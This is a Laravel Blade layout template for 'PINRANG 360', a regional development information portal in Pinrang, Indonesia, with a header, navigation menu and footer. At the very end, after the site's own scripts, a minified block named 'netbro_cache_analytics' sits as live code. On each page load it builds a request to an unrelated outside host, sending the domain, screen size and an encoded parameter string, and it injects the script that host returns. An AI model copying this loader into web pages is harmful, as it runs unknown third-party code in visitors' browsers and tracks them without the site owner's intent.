<!doctype html>
<html lang="{{ app()->getLocale() }}">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="description" content="Pusat Informasi Pembangunan Kabupaten Pinrang">
	<meta name="author" content="Firdaus Masyhur">
	<title>PINRANG 360 - Pusat Informasi Pembangunan Kabupaten Pinrang</title>

	<!-- Favicons-->
	<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
	<link rel="apple-touch-icon" type="image/x-icon" href="img/apple-touch-icon-57x57-precomposed.png">
	<link rel="apple-touch-icon" type="image/x-icon" sizes="72x72" href="img/apple-touch-icon-72x72-precomposed.png">
	<link rel="apple-touch-icon" type="image/x-icon" sizes="114x114" href="img/apple-touch-icon-114x114-precomposed.png">
	<link rel="apple-touch-icon" type="image/x-icon" sizes="144x144" href="img/apple-touch-icon-144x144-precomposed.png">

	<!-- BASE CSS -->
	<link href="/css/bootstrap.min.css" rel="stylesheet">
	<link href="/css/style.css" rel="stylesheet">
	<link href="/css/menu.css" rel="stylesheet">
	<link href="/css/vendors.css" rel="stylesheet">
	<link href="/css/icon_fonts/css/all_icons_min.css" rel="stylesheet">

	<!-- YOUR CUSTOM CSS -->
	<link href="css/custom.css" rel="stylesheet">
	<script src="/js/jquery-2.2.4.min.js"></script>
	<script src="/chart/Chart.bundle.js"></script>
	<script src="/chart/utils.js"></script>
	<script type="text/javascript" src="js/dropzone.js"></script>


</head>

<body>

	<div id="preloader" class="Fixed">
		<div data-loader="circle-side"></div>
	</div>
	<!-- /Preload-->

	<div id="page">
	<header class="header_sticky">
		<a href="#menu" class="btn_mobile">
			<div class="hamburger hamburger--spin" id="hamburger">
				<div class="hamburger-box">
					<div class="hamburger-inner"></div>
				</div>
			</div>
		</a>
		<!-- /btn_mobile-->
		<div class="container">
			<div class="row">
				<div class="col-lg-3 col-6">
					<div id="logo_home">
						<h1><a href="/" title="Pinrang360">Pinrang360</a></h1>
					</div>
				</div>
				<div class="col-lg-9 col-6">
					<ul id="top_access">
						<li><a href="/login"><i class="pe-7s-user"></i></a></li>
						<li><a href="register-doctor.html"><i class="pe-7s-add-user"></i></a></li>
					</ul>
					<nav id="menu" class="main-menu">
						<ul>
							<li>
								<span><a href="/">Home</a></span>
							</li>
              <li><span><a href="#">Profil Daerah</a></span></li>
							<li><span><a href="#">SKPD</a></span></li>
							<li><span><a href="#">Metadata</a></span></li>
							<li><span><a href="#">Bantuan</a></span></li>
						</ul>
					</nav>
					<!-- /main-menu -->
				</div>
			</div>
		</div>
		<!-- /container -->
	</header>
	<!-- /header -->

	<main>
		<br>

		@yield('breadcrumb')
		@yield('modals')
		<!-- /breadcrumb -->
		@yield('content')
	</main>
	<!-- /main content -->

	<footer>
		<div class="container margin_60_35">
			<div class="row">
				<div class="col-lg-3 col-md-12">
					<p>
						<a href="index.html" title="Pinrang360">
							<img src="/img/logo.png" data-retina="true" alt="" width="163" height="36" class="img-fluid">
						</a>
					</p>
				</div>
				<div class="col-lg-3 col-md-4">
					<h5>About</h5>
					<ul class="links">
						<li><a href="#0">About us</a></li>
						<li><a href="blog.html">Blog</a></li>
						<li><a href="#0">FAQ</a></li>
						<li><a href="login.html">Login</a></li>
						<li><a href="register.html">Register</a></li>
					</ul>
				</div>
				<div class="col-lg-3 col-md-4">
					<h5>Useful links</h5>
					<ul class="links">
						<li><a href="#0">Kementerian Dalam Negeri</a></li>
						<li><a href="#0">Kementerian PAN-RB</a></li>
						<li><a href="#0">Provinsi Sulawesi Selatan</a></li>
						<li><a href="#0">Indonesia Satu Data</a></li>
						<li><a href="#0">Download App</a></li>
					</ul>
				</div>
				<div class="col-lg-3 col-md-4">
					<h5>Contact with Us</h5>
					<ul class="contacts">
						<li><a href="tel://61280932400"><i class="icon_mobile"></i> + 61 23 8093 3400</a></li>
						<li><a href="../cdn-cgi/l/email-protection.html#cea7a0a8a18ea8a7a0aaa1adbaa1bce0ada1a3"><i class="icon_mail_alt"></i> <span class="__cf_email__" data-cfemail="6c0409001c2c0a050208030f18031e420f0301">[email&#160;protected]</span></a></li>
					</ul>
					<div class="follow_us">
						<h5>Follow us</h5>
						<ul>
							<li><a href="#0"><i class="social_facebook"></i></a></li>
							<li><a href="#0"><i class="social_twitter"></i></a></li>
							<li><a href="#0"><i class="social_linkedin"></i></a></li>
							<li><a href="#0"><i class="social_instagram"></i></a></li>
						</ul>
					</div>
				</div>
			</div>
			<!--/row-->
			<hr>
			<div class="row">
				<div class="col-md-8">
					<ul id="additional_links">
						<li><a href="#0">Terms and conditions</a></li>
						<li><a href="#0">Privacy</a></li>
					</ul>
				</div>
				<div class="col-md-4">
					<div id="copy">© 2018 DISKOMINFO-PINRANG</div>
				</div>
			</div>
		</div>
	</footer>
	<!--/footer-->
	</div>
	<!-- page -->

	<div id="toTop"></div>
	<!-- Back to top button -->

	<!-- COMMON SCRIPTS -->
	<script data-cfasync="false" src="/cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script>
	
	<script src="/js/common_scripts.min.js"></script>
	<script src="/js/functions.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BNGFhS0r%2bwj6Ur%2b85rGHMzrPOWVgA21kppoP6o04%2b6ylPJXfuhRwdg27T%2fTCXazofwuUS5v1em5JlehXXo7QvNofeghisP%2f7yCZ%2f6gVGZJuzPj1Z9B4%2b%2fr8%2bZhIFRo2PGlcPIc28fHiy4%2bbpeaWlm7Z85CrH1dG9B7BE%2boZqsWXubV8iE%2bD82mMkizExq%2bI6HDO0HjZ5q0hwkQ%2brE5Gnc4ZABUfV5qWbpvvTZMeRsKQKhy7dDH6f3K5SqDcQ8UYUPWJtMh%2bpAdMobNALyGdRoI92mvM5p2QcZGu9w8a%2b3bX54EBR0XPWyHLTGpOz%2bXJXkiVB00eQKjSnBOh3qfuNXJFMVECYd1f7vDgwvTnN8ltGdqNgWZxEiaJL4hO5BAYKo9EOyoPVXqJrsercspOJEbodCSzQa46WON2DnacSDK67okewFdVf%2f6aK%2bM0jY5h" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    </body>
</html>
